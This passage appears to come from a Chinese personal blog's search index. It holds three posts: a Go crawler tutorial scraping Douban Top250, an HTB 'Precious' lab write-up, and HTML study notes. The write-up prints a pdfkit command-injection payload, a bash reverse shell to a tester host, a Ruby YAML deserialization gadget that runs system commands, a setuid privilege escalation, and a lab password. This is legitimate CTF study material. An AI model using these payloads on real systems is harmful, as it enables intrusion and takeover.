goroutine 量，我们的页面总数就是 10，所以这里可以直接写出来。\n另外这里使用了 defer 关键字来调用 wg.Done，以确保在退出 goroutine 的闭包之前，向 WaitGroup表明了我们已经退出。由于要执行 wg.Done 和 parseUrls2 件事，所以不能直接用 go 关键字，需要把语句包一下。不过要注意，在闭包中需要把参数i作为 func 的参数传入，要不然 i 会使用最后一次循环的那个值：\n// 错误代码👇\nfor i := 0; i &lt; 10; i++ &#123;\n    go func() &#123;\n        defer wg.Done()\n        parseUrls(\"https://movie.douban.com/top250?start=\"+strconv.Itoa(25*i))\n    &#125;()\n&#125;\n❯ go run crawler/doubanCrawler5.go\nFetch Url https://movie.douban.com/top250?start=75\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=250\nFetch Url https://movie.douban.com/top250?start=200\n...\n\n在这样的用法中，WaitGroup 相当于是一个协程安全的并发计数器：调用 Add 增加计数，调用 Done 减少计数。调用 Wait 会阻塞并等待至计数器归零。这样也实现了并发和等待全部 goroutine 执行完成：\nTook 2.2960197s\nProcess finished with the exit code 0\n\n0x03 使用 goquery在写爬虫的时候，想要对 HTML 内容进行选择和查找匹配时通常是不直接写正则表达式的：因为正则表达式可读性和可维护性比较差。用 Python 写爬虫这方面可选择的方案非常多了，其中有一个被开发者常用的库 pyquery，而 Golang 也有对应的 goquery，可以说 goquery 是 jQuery 的 Golang 版本实现。借用jQueryCSS选择器的语法可以非常方便的实现内容匹配和查找。\n安装 goquerys\ngoquery 是第三方库，需要手动安装：\n\ngo get github.com/PuerkitoBio/goquery\n\n当然在 Goland 里面导入也可\n创建文档goquery 向外暴露的结构主要是 goquery.Document，一般是由2种方法创建的：\ndoc, error := goquery.NewDocumentFromReader(reader io.Reader)\ndoc, error := goquery.NewDocument(url string)\n\n第二种直接传入了 url，但是往往我们会对请求做很多定制（如添加头信息、设置 Cookie 等），所以常用的是第一种方法，我们的代码也要做对应的改动\nimport (\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n    \"strconv\"\n    \"time\"\n\n    \"github.com/PuerkitoBio/goquery\"\n)\n\nfunc fetch(url string) *goquery.Document &#123;\n    ...\n    defer resp.Body.Close()\n    doc, err := goquery.NewDocumentFromReader(res.Body)\n    if err != nil &#123;\n        log.Fatal(err)\n    &#125;\n    return doc\n\n之前是把 res.Body 转成字符返回，现在直接返回 goquery.Document 类型的 doc 了\nCSS 选择器\n关于 CSS 选择器的语法可以看这个链接 https://www.w3school.com.cn/cssref/css_selectors.asp\n\n这里说 CSS 选择器的原因是因为 doc.find，也就是 goquery.Document.find() 其中的参数就是需要通过 CSS 选择器来完成的，我们可以先来看一下豆瓣 TOP250 单个条目的源代码\n&lt;ol class=\"grid_view\">\n  &lt;li>\n    &lt;div class=\"item\">\n      &lt;div class=\"info\">\n        &lt;div class=\"hd\">\n          &lt;a href=\"https://movie.douban.com/subject/1292052/\" class=\"\">\n            &lt;span class=\"title\">肖申克的救赎&lt;/span>\n            &lt;span class=\"title\">&amp;nbsp;/&amp;nbsp;The Shawshank Redemption&lt;/span>\n            &lt;span class=\"other\">&amp;nbsp;/&amp;nbsp;月黑高飞(港)  /  刺激1995(台)&lt;/span>\n          &lt;/a>\n          &lt;span class=\"playable\">[可播放]&lt;/span>\n        &lt;/div>\n      &lt;/div>\n    &lt;/div>\n  &lt;/li>\n  ....\n&lt;/ol>\n\n我们这里需要的元素只是电影名，所以如果要用 CSS 选择器的话就要这样写 doc.find() 的语句\nfunc parseUrls(url string, ch chan bool) &#123;\n    doc := fetch(url)\n    doc.Find(\"ol.grid_view li\").Find(\".hd\").Each(func(index int, ele *goquery.Selection) &#123;\n        movieUrl, _ := ele.Find(\"a\").Attr(\"href\")\n        fmt.Println(strings.Split(movieUrl, \"/\")[4], ele.Find(\".title\").Eq(0).Text())\n    &#125;)\n    time.Sleep(2 * time.Second)\n    ch &lt;- true\n&#125;\n\ndoc.Find() 的参数就是 css 选择器，而且 Find 支持链式调用。这里的代码含义是先找 ”grid_view” 的所有 ol 下的 li 元素，然后再找 li 元素里面以 hd 为名字的元素（看上面的HTML 可以知道是 div）。Find 找到的结果是列表，需要使用 Each 方法循环获得，可以传递一个包含索引 index 和子元素 ele 参数的函数，获得具体内容的逻辑就在这个函数中。\n在上面的例子中，类名叫做 title 的 span 一共有2个，所以需要取第一个（用 Eq(0)），Text 方法可以获得元素的内容。而获得条目 ID 的方法是先拿到条目页面链接（用 Attr 获得 href 属性，注意，它返回2个参数，第一个是属性值，第二是是否存在这个属性）。这样就拿到了 ID 和标题了\nPS：其实爬虫练习的目的已经达到了，获得更多内容就是多写些逻辑罢了。\n0x04 使用 soup这个库实际上就是类似于 Python 的 BS4 库 ———— BeautifulSoup\n我们也来尝试写一下 golang 里面的 Soup 库\n安装 soupsoup 是第三方库，需要手动安装：\ngo get github.com/anaskhan96/soup\n\n同样，也可以在 Goland 里面安装\n使用 soup我们可以先写一个最简单的 GET 请求，大致代码如下\nimport (\n    \"fmt\"\n    \"log\"\n    \"strconv\"\n    \"strings\"\n    \"time\"\n\n    \"github.com/anaskhan96/soup\"\n)\n\nfunc fetch(url string) soup.Root &#123;\n    fmt.Println(\"Fetch Url\", url)\n    soup.Headers = map[string]string&#123;\n        \"User-Agent\": \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",\n    &#125;\n\n    source, err := soup.Get(url)\n    if err != nil &#123;\n        log.Fatal(err)\n    &#125;\n    doc := soup.HTMLParse(source)\n    return doc\n&#125;\n\n这次不再用内置的 net/http 这个包了。soup 支持直接设置 Headers（以及 Cookies）的值，也可以实现自定义头信息和 Cookie，然后就可以 soup.Get(url) 了，然后用 soup.HTMLParse 就可以获得文档对象了，这其实也就是 goquery 中的 doc\n相比起 goquery 不同的是，这里我们要将代码逻辑修改为应用 soup 库的，所以大体上还是差不多的。\nfunc parseUrls(url string, ch chan bool) &#123;\n\tdoc := fetch(url)\n\tfor _, root := range doc.Find(\"ol\", \"class\", \"grid_view\").FindAll(\"div\", \"class\", \"hd\") &#123;\n\t\tmovieUrl, _ := root.Find(\"a\").Attrs()[\"href\"]\n\t\ttitle := root.Find(\"span\", \"class\", \"title\").Text()\n\t\tfmt.Println(strings.Split(movieUrl, \"/\")[4], title)\n\t&#125;\n\ttime.Sleep(2 * time.Second)\n\tch &lt;- true\n&#125;\n\n可以感受到和 goquery 都用了 Find 这个方法名字，但是参数形式不一样，需要传递三个：「标签名」、「类型」、「具体值」。如果有多个可以使用 FindAll (Find是找第一个)。如果不是很多可以使用多次的 Find，或者循环。如果想要找属性的值需要用 Attrs 方法，从 map 里面获得。\n获得文本还是用 Text 方法。另外它内有 goquery 那样的 Each 方法，需要手动写一个 for range 格式的循环。\n0x05 使用 XPath在这个系列文章里面已经介绍了 BeautifulSoup 的替代库 soup 和 Pyquery 的替代库goquery，但其实很多人写 Python 爬虫最愿意用的页面解析组合是 lxml+XPath 。为什么呢？先分别说一下 lxml 和 XPath 的优势吧\nlxmllxml 是 HTML&#x2F;XML 的解析器，它用 C 语言实现的 libxml2 和l ibxslt 的Python 绑定。除了效率高，还有一个特点是文档容错能力强。\nXPath\n最早我自己写 Python 爬虫接触的就是这个，搞了好久才搞懂（当时巨菜无比）；刚接触时会感觉无比难，现在回过头来看感觉还行\n\nXPath全称XML Path Language，也就是XML路径语言，是一门在XML文档中查找信息的语言，最初是用来搜寻XML文档的，但是它同样适用于HTML文档的搜索。通过编写对应的路径表达式或者使用内置的标准函数，可以方便的直接获取到想要的任何内容，不用像soup和goquery那样要用Find方法链式的找节点再用Text之类的方法或者对应的值（也就是一句代码就拿到结果了），这就是它的特点和优势，而lxml正好支持XPath，所以lxml+XPath一直是我写爬虫的首选。\nXPath与BeautifulSoup(soup)、Pyquery(goquery)相比，学习曲线要高一些，但是学会它是非常有价值的，你会爱上它。你看我现在，原来用Python写爬虫学会了XPath，现在可以直接找支持XPath的库直接用了。\n另外说一点，如果你非常喜欢 BeautifulSoup，一定要选择 BeautifulSoup+lxml 这个组合，因为 BeautifulSoup 默认的 HTML 解析器用的是 Python 标准库中的 html.parser，虽然文档容错能力也很强，但是效率会差很多。\n我学习XPath是通过w3school，参考链接 https://www.w3school.com.cn/xpath/xpath_intro.asp\nGolang 中的 Xpath 库用 Golang 写的 Xpath 库是很多的，由于我还没有什么实际开发经验，所以能搜到的几个库都试用一下，然后再出结论吧。\n首先把豆瓣 Top250 的部分 HTML 代码贴出来\n&lt;ol class=\"grid_view\">\n  &lt;li>\n    &lt;div class=\"item\">\n      &lt;div class=\"info\">\n        &lt;div class=\"hd\">\n          &lt;a href=\"https://movie.douban.com/subject/1292052/\" class=\"\">\n            &lt;span class=\"title\">肖申克的救赎&lt;/span>\n            &lt;span class=\"title\">&amp;nbsp;/&amp;nbsp;The Shawshank Redemption&lt;/span>\n            &lt;span class=\"other\">&amp;nbsp;/&amp;nbsp;月黑高飞(港)  /  刺激 1995(台)&lt;/span>\n          &lt;/a>\n          &lt;span class=\"playable\">[可播放]&lt;/span>\n        &lt;/div>\n      &lt;/div>\n    &lt;/div>\n  &lt;/li>\n  ....\n&lt;/ol>\n\n还是原来的需求：获得条目 ID 和标题\ngithub.com&#x2F;lestrrat-go&#x2F;libxml2lestrrat-go/libxml2 是一个 libxml2 的 Golang 绑定库\n我们先用 lestrrat-go/libxml2 写一段简单的 HTTP 发包\nimport (\n        \"log\"\n        \"time\"\n        \"strings\"\n        \"strconv\"\n        \"net/http\"\n\n        \"github.com/lestrrat-go/libxml2\"\n        \"github.com/lestrrat-go/libxml2/types\"\n        \"github.com/lestrrat-go/libxml2/xpath\"\n)\n\nfunc fetch(url string) types.Document &#123;\n        log.Println(\"Fetch Url\", url)\n        client := &amp;http.Client&#123;&#125;\n        req, _ := http.NewRequest(\"GET\", url, nil)\n        req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\")\n        resp, err := client.Do(req)\n        if err != nil &#123;\n                log.Fatal(\"Http get err:\", err)\n        &#125;\n        if resp.StatusCode != 200 &#123;\n                log.Fatal(\"Http status code:\", resp.StatusCode)\n        &#125;\n        defer resp.Body.Close()\n        doc, err := libxml2.ParseHTMLReader(resp.Body)\n        if err != nil &#123;\n                log.Fatal(err)\n        &#125;\n        return doc\n&#125;\n\nfetch 函数和之前的整体一致，doc 是用 libxml2.ParseHTMLReader(resp.Body) 获得的。parseUrls 的改动比较大：\nfunc parseUrls(url string, ch chan bool) &#123;\n        doc := fetch(url)\n        defer doc.Free()\n        nodes := xpath.NodeList(doc.Find(`//ol[@class=\"grid_view\"]/li//div[@class=\"hd\"]`))\n        for _, node := range nodes &#123;\n                urls, _ := node.Find(\"./a/@href\")\n                titles, _ := node.Find(`.//span[@class=\"title\"]/text()`)\n                log.Println(strings.Split(urls.NodeList()[0].TextContent(), \"/\")[4],\n                        titles.NodeList()[0].TextContent())\n        &#125;\n        time.Sleep(2 * time.Second)\n        ch &lt;- true\n&#125;\n\n\n可以说是经典的 XPath 写法了，看到就菊花一紧（bushi\n\ngithub.com&#x2F;antchfx&#x2F;htmlqueryhtmlquery 如其名，是一个对 HTML 文档做 XPath 查询的包。它的核心是 antchfx&#x2F;xpath，项目更新频繁，文档也比较完整。\n接着按需求修改：\nimport (\n    \"log\"\n    \"time\"\n    \"strings\"\n    \"strconv\"\n    \"net/http\"\n\n    \"golang.org/x/net/html\"\n    \"github.com/antchfx/htmlquery\"\n)\n\nfunc fetch(url string) *html.Node &#123;\n    log.Println(\"Fetch Url\", url)\n    client := &amp;http.Client&#123;&#125;\n    req, _ := http.NewRequest(\"GET\", url, nil)\n    req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\")\n    resp, err := client.Do(req)\n    if err != nil &#123;\n        log.Fatal(\"Http get err:\", err)\n    &#125;\n    if resp.StatusCode != 200 &#123;\n        log.Fatal(\"Http status code:\", resp.StatusCode)\n    &#125;\n    defer resp.Body.Close()\n    doc, err := htmlquery.Parse(resp.Body)\n    if err != nil &#123;\n        log.Fatal(err)\n    &#125;\n    return doc\n&#125;\n\nfetch 函数主要就是修改 htmlquery.Parse(resp.Body) 和函数返回值类型 *html.Node。再看看 parseUrls：\nfunc parseUrls(url string, ch chan bool) &#123;\n    doc := fetch(url)\n    nodes := htmlquery.Find(doc, `//ol[@class=\"grid_view\"]/li//div[@class=\"hd\"]`)\n    for _, node := range nodes &#123;\n        url := htmlquery.FindOne(node, \"./a/@href\")\n        title := htmlquery.FindOne(node, `.//span[@class=\"title\"]/text()`)\n        log.Println(strings.Split(htmlquery.InnerText(url), \"/\")[4],\n            htmlquery.InnerText(title))\n    &#125;\n    time.Sleep(2 * time.Second)\n    ch &lt;- true\n&#125;\n\nantchfx/htmlquery 的体验比 lestrrat-go/libxml2 要好，Find 是选符合的节点列表，FindOne 是找符合的第一个节点。\n","categories":["工具开发&编写"],"tags":["工具开发&编写"]},{"title":"HTB 靶机 Precious","url":"/2023/03/08/HTB-%E9%9D%B6%E6%9C%BA-Precious/","content":"HTB 靶机 Precious\n\n0x01 靶机攻破记录nmap 探测存活目标 IP 10.10.11.189，先 nmap 进行扫描\n\n\n扫出来两个端口，一个 22 端口，另外一个是 80 端口，并且显示 80 端口重定向到 precious.htb，这就想到了 TCTF 上有道题目，就是要我们在 /etc/hosts 中将 IP 与域名设置对应关系。\n打开 /etc/hosts 添加对应域名\n\n\n此时访问 10.10.11.189 就会自动重定向到 http://precious.htb/ 去\nweb 界面渗透界面如图，明显是一个将 Web 界面转换为 PDF 的网站\n\n\n我们在本地先开一个 777 的端口，让这个 Web 界面转换为的 PDF 的功能点访问\n\n\n如图，现在的 Web 界面确实变成了图片，我们可以将图片下载下来进行分析\n\n\n将 PDF 下载下来之后对其进行分析，用的工具是 exiftool，这个工具之前在文件上传打的时候也用到过\n\n\n其中获得到的有用信息是最后一句，Generated by pdfkit v0.8.6，我们去检索关于 pdfkit v0.8.6 的相关漏洞，发现存在对应 CVE，编号为 CVE-2022-25765\nCVE-2022-25765 漏洞利用https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795\n这个漏洞的意思就是，我们的输入需要是正常 URL 开头，而参数 ?name 存在命令执行的漏洞，漏洞利用 payload 如下\nhttp:&#x2F;&#x2F;10.10.14.64?name&#x3D;%20&#96;whoami&#96;\n\n\n\n尝试弹 shell\n?name=%20`bash -c \"sh -i >&amp; /dev/tcp/10.10.14.64/9999 0>&amp;1\"`'&#125;\n\n\n\n虽然拿到了 shell，但是没找到 flag 所在的地方。在经过一系列操作后，发现我们目前的用户是 ruby，但是还有一个用户叫 henry，henry 所在的文件夹中存在一个 user.txt，没有 root 权限打不开\n\n当时这一步卡住了，太没有经验了，其实不一定是必须要提权，我们想办法横移去搞到 henry 的密码其实也是可以的\n\n横移，获取 henry 密码并提权在 /home/ruby/.bundle 目录下发现一个 config 文件,里面有 henry 账号的用户和密码\n\n\nhenry:Q3c1AqGHtoI0aXAYFH\n\n因为拿到了用户名密码，所以这里可以直接用 ssh 登录，经过之前 nmap 的扫描结果，22 端口是开着的\n\n\nhenry 目录下有一个 user.txt，cat 之后没有特别搞懂这个东西有啥用\n\n\nhenry@precious:~$ cat user.txt\n6a8b54de52c4dfcffd10de2ddebe27d7\n\n这里拿的 user.txt 并不是成为 root 的密码，感觉不知道有啥用，但是先看看成为 henry 之后是否能拥有一些命令的权限\n\n\n发现有一个 .rb 的文件是需要 root 权限，但是用户 henry 也可以运行的，我们 cat 一下看看\n# Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(\"dependencies.yml\"))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts \"Installed version differs from the one specified in file: \" + local_name\n            else\n                puts \"Installed version is equals to the one specified in file: \" + local_name\n            end\n        end\n    end\nend\n\n\n看到 yaml.load()，一眼 yaml 类型的反序列化漏洞，猜测可能是个 ruby 里面提权的漏洞吧？搜索一下相关资料。通过 google 发现，ruby yaml 有一个反序列化的漏洞\n\npayload为\nhttps:&#x2F;&#x2F;gist.github.com&#x2F;staaldraad&#x2F;89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml\n\n在这里程序调用的是 dependencies.yml，所以我们需要把 payload 放进去\ndependencies..yml\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &amp;1 !ruby/object:Net::BufferedIO\n      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &amp;1 !ruby/object:Net::WriteAdapter\n         socket: &amp;1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: id\n         method_id: :resolve\n\ngit_set: id 这里就是命令执行\n这里把 dependencies.yml 保存到了 /home/henry 下其实不太理解，因为并不是在同一路径，不过这样居然也可行，执行 ruby 文件\nsudo /usr/bin/ruby /opt/update_dependencies.rb\n\n\n可以看到这里成功进行命令执行了\n\n那么对于我们来说，这个命令执行一般就是提权用的，替换如下\ngit_set: \"chmod +s /bin/bash\"\n\n成功提权了！\n\n\n拿下\n\n\nroot:4eca6a2b2f7eb9a4a00ebbbbc66a889a\n\n提交此 hash 即可\n0x02 小结挺有意思的一道入门题，拓宽了很多视线，提权不一定完全需要 Linux 内部版本漏洞提权，也可以是一些代码的提权。并且从外网打进来的方式也很骚，这种方式打的太骚了。\n","categories":["HTB"],"tags":["HTB"]},{"title":"H5前端学习手记","url":"/2022/06/27/H5%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/","content":"H5前端学习手记\n\nH5 前端学习手记0x01 前言最近要开发了，感觉一个人开发的话还是先有前端再有后端比较好写，一些后端的接口什么的感觉不是特别难。\n快捷键\n这一块和 emmet 语法放在一起说\n\nvscode 中的快捷键! 新建 html 的一些基础文件ctrl + &#x2F;，快速注释。进行快速格式化，shift + alt + f，自动对齐，爽的一笔\n生成标签：先写标签，然后 tab 即可\n生成多个标签例如 &lt;div&gt;*3* 快速生成三个 div\n包含标签例如 &lt;ul&gt; 包含 &lt;li&gt; 可以用如下语法生成 ul&gt;li\n并列标签例如 &lt;div&gt; 与 &lt;p&gt;，可以用 div+p 生成\n快速定义 class 与 id定义 &lt;div&gt; 的 class 与 id，本来我们的写法是这样的\n&lt;div class=\"one\"> 123 &lt;/div>\n&lt;div id=\"one\"> 123 &lt;/div>\n\n快速写法：div.one 与 div#one，语法如下\n标签名.类名\n标签名#id名\n\n\n这种方式在实际开发当中应用的相当常见。会配合自增符号 $\n\np.topheading$*5 这样会自动生成 topheading1 - topheading5 这样五个类。有点np\n快速填写内容语法\n标签&#123;要输入的内容&#125;\n比如 div&#123;123&#125; 等价于\n&lt;div>123&lt;/div>\n\n\n0x02 HTML 标签标题标签H1 - H5\n段落与换行标签\n段落标签 ———— &lt;p&gt;&lt;/p&gt;。\n\n英文对应 paragraph，也就是平常我们的写文章分段。\n\n换行标签 ———— &lt;br/&gt;\n\n英文对应 break\n文本格式化标签就是给文字加样式，例如加粗，斜体\n\n\ndiv 与 span 标签\n感觉这个挺重要的！\n\n&lt;div&gt; 与 &lt;span&gt; 标签没有具体的含义，只是作为盒子一样，用来装内容的。就是 div class 什么的嘛\ndiv 的英文是 division；span 的英文是 span，中文为跨度。\ndiv 与 span 的特点&lt;div&gt; 标签用来布局，但是一行只能放一个 &lt;div&gt; 大盒子。&lt;span&gt; 标签用来布局，一行可以放多个 &lt;span&gt; 小盒子。\n\n\n这就是大盒子与小盒子。\n图像标签与路径\n图像标签 ———— &lt;img&gt;，单词缩写为 image\n语法格式如下\n\n&lt;img src=\"图像URL\" />\n\nsrc 是 &lt;img&gt; 标签的必须属性，用于指定图像文件的路径与用户名。\nimg 标签的一些其他属性\n\n\n属性名\n作用\n语法\n\n\n\nalt\n当图像显示不出来时用文字替换\nalt&#x3D;””\n\n\ntitle\n鼠标放到图像上显示的文字\ntitle&#x3D;””\n\n\nwidth\n设置图像的宽度\nwidth&#x3D;””\n\n\nheight\n设置图像的高度\nheight&#x3D;””\n\n\nborder\n设置图像的边框粗细\nborder&#x3D;””\n\n\n宽度和高度只要修改一个就可以了，其余的会等比缩放。\n\nborder 的边框设置一般通过 css 进行设置。\n\n路径主要是绝对路径和相对路径吧，这块自己本身也是想思考思考的\n\n相对路径\n\n\n\n\n绝对路径\n\n图床方式就是一种绝对路径，还有一种是电脑盘内的路径\n超链接标签（重要！）使用的是 &lt;a&gt; 这个标签，英文全称为 “anchor”，意为锚语法格式\n&lt;a href=\"跳转目标\" target=\"目标窗口的弹出方式\"> 文本或图像 &lt;/a>\n\n有两个属性\n\n\n\n属性名\n作用\n\n\n\nhref\n用于指定链接的 url 地址\n\n\ntarget\n用于打开指定链接的方式\n\n\n\ntarget 这里，_self 为默认，__blank 为打开一个新窗口。\n\n外部链接与内部链接就和绝对路径与相对路径差不多\n可以用这个方法提供文件下载的服务：\n&lt;a href=\"img.zip\"> 下载文件 &lt;/a>\n\n链接与图片结合&lt;a href=\"http://baidu.com\">&lt;img src=\"img.jpg\" />&lt;/a>\n\n这样一来，我们可以通过点击图片进行链接跳转。\n锚点链接(重要！)就有点像目录的那种感觉\n\n\n\n如何实现的呢？\n\n我们先在要实现的目标位置的标签先加一个 id 属性，例如这样\n&lt;h3 id=\"two\"> 0x02 CC7 链分析&lt;/h3>\n\n接着做链接\n&lt;a href=\"#two\"> CC7 链分析&lt;/a>\n\n\n这个挺牛逼的，嗯。\n\n特殊字符\n\n\n特殊字符\n描述\n字符的代码\n\n\n\n空格符\n空格符\n&amp;nbsp;\n\n\n&lt;\n小于号\n&amp;It\n\n\n\n|大于号|&amp;gt;|&amp;|和号|&amp;amp;|￥|人民币|&amp;yen;|©|版权|&amp;copy;|®|注册商标|&amp;reg;|℃|摄氏度|&amp;deg;|±|正负号|&amp;plusmn;|×|乘号|&amp;times;|÷|除号|&amp;divide;|²|平方|&amp;sup2;|³|立方|&amp;sup3;|\n\n表格标签\n在 ASP 里面一般表格会和 SQL 语句结合一下吧。\n\n表格的基本语法\n&lt;table>\n\t&lt;tr>\n\t\t&lt;td>单元格内的文字&lt;/td>\n\t\t...\n\t&lt;/tr>\n\t...\n&lt;/table>\n\n\n\n最外面是 &lt;table&gt;，中间是 &lt;tr&gt;，最里面是 &lt;td&gt;\n&lt;table&gt;&lt;/table&gt; 标签用来定义表格&lt;tr&gt;&lt;/tr&gt; 标签必须嵌套在 &lt;table&gt;&lt;/table&gt; 标签中&lt;td&gt;&lt;/td&gt; 标签必须嵌套在 &lt;tr&gt;&lt;/tr&gt; 标签中\n这种情况下创建的表格是有问题的，不带有边框。在实际开发里面一般是通过 CSS 设计，不在 html 的属性里面直接写。\n\n\n标头\n专门用来定义第一行的内容，一般用法 &lt;th&gt;&lt;/th&gt;，标头单元格的文字会加粗居中显示。\n\n表格的一些属性\n这些属性要写到表格里面。\n\n\n\n表格结构标签\n&lt;thead&gt; 用来表示表格的头部区域\n&lt;tbody&gt; 用来表示表格的主体区域\n\n可以让表格结构更清晰\n合并单元格这种情况下我们需要进行合并单元格的操作\n\n\n跨行合并：rowspan=&quot;合并单元格的个数&quot;跨列合并：colspan=&quot;合并单元格的个数&quot;\n写法\n&lt;td colspan=\"2\">123&lt;/td>\n&lt;td rowspan=\"2\">123&lt;/td>\n\n\n列表标签（重要！）\n表格用来显示数据，列表用来布局。\n\n无序列表&lt;ul&gt; 表示无序列表，&lt;ul&gt; 里面放 &lt;li&gt;，对应的英文。\nul —- unordered listli —- list item\n\n大致语法\n\n&lt;ul>\n\t&lt;li>列表项1&lt;/li>\n\t&lt;li>列表项2&lt;/li>\n\t&lt;li>列表项3&lt;/li>\n&lt;/ul>\n&lt;ul&gt; 里面只能嵌套 &lt;li&gt;，不能放其他元素，要加样式什么的可以去 &lt;li&gt; 里面加。\n这个效果就和 markdown 里面的 &quot;-&quot; 快捷键一样，一个小黑点。\n有序列表排列的，像积分榜这种。\n&lt;ol&gt; 表示无序列表，&lt;ol&gt; 里面放 &lt;li&gt;，对应的英文。\nol —- ordered listli —- list item\n&lt;ol>\n\t&lt;li>列表项1&lt;/li>\n\t&lt;li>列表项2&lt;/li>\n\t&lt;li>列表项3&lt;/li>\n&lt;/ol>\n\n\n注意事项和无序列表是一致的。\n\n有序列表一般和 CSS 结合起来用\n自定义列表（重要！）&lt;dl&gt; 表示无序列表，&lt;dl&gt; 里面放 &lt;dt&gt; 和 &lt;dd&gt;，对应的英文。\ndl —- definition listdt —- definelist titledd —- definition description\n语法\n&lt;dl>\n &lt;dt>成绩排行榜&lt;/dt>\n &lt;dd>Drunkbaby倒数第一&lt;/dd>\n &lt;dd>dll天下第一&lt;/dd>\n&lt;/dl>\n\n\n\ndl 最大，dt 标题一样的作用，dd 内容这里我们写出来的是有点小问题，可以通过 css 修饰的。\n可以有多个 dt 与 dd\n表单标签\n一个表单通常由表单域、表单控件（也称为表单元素）和提示信息。\n\n\n\n表单域&lt;form&gt; 标签打头，它的语法\n&lt;form action=\"url地址\" method=\"提交方式\" name=\"表单域名称\">\n\t各种表单元素控件\n&lt;/form>\n\n\n一些常用属性\n\n\n\n\n属性\n属性值\n作用\n\n\n\naction\nurl 地址\n接收表单的服务器地址\n\n\nmethod\nGET&#x2F;POST\n设置表单提交方式\n\n\nname\n名称\n表单名称，和 id 类似\n\n\n表单控件（表单元素）input 输入表单元素输入信息，就比如登陆界面。\n语法\n&lt;input type=\"属性值\" />\ntype 属性&lt;input&gt; 表单元素必须的一个属性是 type，type 的属性值如下表。\n\n\n\n属性值\n描述\n\n\n\nbutton\n定义可点击按钮，一般用 JavaScript 启动\n\n\ncheckbox\n定义复选框\n\n\nfile\n定义输入字段和”浏览”按钮，提供文件上传\n\n\nhidden\n定义隐藏的输入字段\n\n\nimage\n定义图像形式的提交按钮\n\n\npassword\n定义密码字段，字符被掩盖\n\n\nradio\n定义单选按钮\n\n\nreset\n定义重置按钮\n\n\nsubmit\n定义提交按钮\n\n\ntext\n定义单行输入字段\n\n\n\ntext 和 password\n\n用户名：&lt;input type=\"text\" placeholder=\"text\"> &lt;br />\n\n 密码：&lt;input type=\"password\" placeholder=\"password\"> &lt;br />\n\nplaceholder 这里就是输入为空的显示。\n\nradio 单选框和 checkbox 多选框\n\n我已知晓隐私策略 &lt;input type=\"radio\">&lt;br />\n\n 爱好: 吃饭 &lt;input type=\"checkbox\" > 睡觉 &lt;input type=\"checkbox\" > 敲代码 &lt;input type=\"checkbox\" >\n\n要将单选框实现多选一的业务功能，我们需要将这些单选框设置为同一个 name 属性。同样对于复选框也是\n性别：男 &lt;input type=\"radio\" name=\"sex\" /> &lt;br /> 女 &lt;input type=\"radio\" name=\"sex\" /> &lt;br />\n\n爱好: 吃饭 &lt;input type=\"checkbox\" name=\"hobby\" /> 睡觉 &lt;input type=\"checkbox\" name=\"hobby\"> 敲代码 &lt;input type=\"checkbox\" name=\"hobby\">\n\n\nsubmit 提交按钮和 reset 重置按钮\n\nvalue 就是名称，是显示的\n\n\n&lt;input type=\"submit\" value=\"免费注册\"/>\n&lt;input type=\"reset\" value=\"重置密码\" />\n\n会把表单提交到后端的文件，在 form 里面设置 action 的地址\n\nbutton 按钮与 file 文件上传\n\n只会做某件事，不会提交数据，与 JavaScript 结合使用。\n&lt;input type=\"button\" value=\"发送验证码\" /> &lt;br />\n\n 上传头像：&lt;input type=\"file\" >\n\ninput 的一些其他属性\n\n\n属性\n属性值\n描述\n\n\n\nname\n由用户自定义\n控件的名称\n\n\nvalue\n由用户自定义\ninput 控件中的默认文本值\n\n\nsize\n正整数\ninput 控件在页面中的显示宽度\n\n\nchecked\nchecked\n定义选择控件默认被选中的项\n\n\nmaxlength\n正整数\n控件允许输入的最多字符数\n\n\n\n一般都是要加上 value 的，因为要传给后端。\nchecked 就是默认被选中，主要针对单选按钮和复选按钮。\n\n\nlabel 标签label 标签主要目的是为了提高用户体验。为用户提高最优秀的服务。常常和多选框，单选框配合使用。\n作用：用于绑定一个表单元素, 当点击 label 标签的时候, 被绑定的表单元素就会获得输入焦点。\n&lt;label&gt; 里面的 for 属性要与对应元素的 id 属性相同。\n&lt;label for=\"username\">用户名：&lt;/label> &lt;input type=\"text\" placeholder=\"text\" name=\"username\" id=\"username\">\n\n\nselect 下拉表单元素\n望文生义，就是下拉一样\n\n语法\n职业选择：&lt;select>\n &lt;option>学生&lt;/option>\n &lt;option>政企人员&lt;/option>\n &lt;option>待就业&lt;/option>\n&lt;/select>\n\n\n在 option 是可以定义一个 selected=&quot;selected&quot;，将其作为默认选中的。\n\ntextarea 文本域元素适用情况如图\n\n\n\ncols&#x3D;”每行中的字符数” rows&#x3D;”显示的行数”  我们实际开发不用。\n\n语法如下\n留言评论：&lt;textarea rows=\"5\" cols=\"20\">\n 